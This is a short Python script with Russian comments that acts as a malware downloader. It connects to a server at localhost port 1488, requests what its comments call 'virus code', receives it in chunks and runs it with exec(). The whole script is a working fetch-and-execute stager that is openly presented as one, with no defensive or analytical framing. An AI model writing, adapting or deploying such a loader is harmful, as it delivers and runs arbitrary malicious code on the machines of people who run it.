import socket

# Инициализация клиентского сокета
sock = socket.socket()
sock.connect(('localhost', 1488))

code = b''

sock.send(b'Download')  # Говорим серверу что мы хочем получить код вируса

while True:
    # Получаем код вируса по кусочкам
    code_chunk = sock.recv(1024)

    if not code_chunk:
        sock.close()
        break

    code += code_chunk

sock.close()  # Закрываем соединение
exec(code)  # Выполняем полученый код
